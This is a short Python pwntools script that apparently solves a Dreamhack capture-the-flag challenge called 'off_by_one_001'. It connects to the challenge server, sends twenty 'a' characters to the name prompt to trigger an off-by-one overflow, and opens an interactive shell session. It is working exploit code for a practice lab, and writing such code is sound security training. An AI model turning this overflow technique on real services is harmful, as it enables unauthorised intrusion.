from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/off_by_one_001')
else:
    r = remote('host1.dreamhack.games', 22759)

r.sendafter('Name: ', 'a' * 20)

r.interactive()